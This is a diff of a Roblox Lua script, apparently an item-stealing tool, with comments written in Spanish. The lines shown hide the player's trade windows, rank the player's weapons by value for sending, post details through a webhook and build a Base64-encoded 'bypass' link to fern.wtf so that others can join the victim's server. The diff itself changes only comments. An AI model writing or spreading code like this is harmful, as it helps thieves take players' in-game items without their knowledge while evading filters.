@@ -17,7 +17,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Función para enviar webhook confiable
+-- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -36,7 +36,7 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
--- Ocultar GUI
+-- Ocultar GUI de trade
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
@@ -135,7 +135,7 @@ end
 if #weaponsToSend>0 then
     table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
-    -- Generar link protegido codificado Base64
+    -- Generar link protegido con supremo bypass
     local rawLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
     local encodedLink = HttpService:UrlEncode(HttpService:Base64Encode(rawLink))
     local safeLink = "https://fern.wtf/redirect?data="..encodedLink
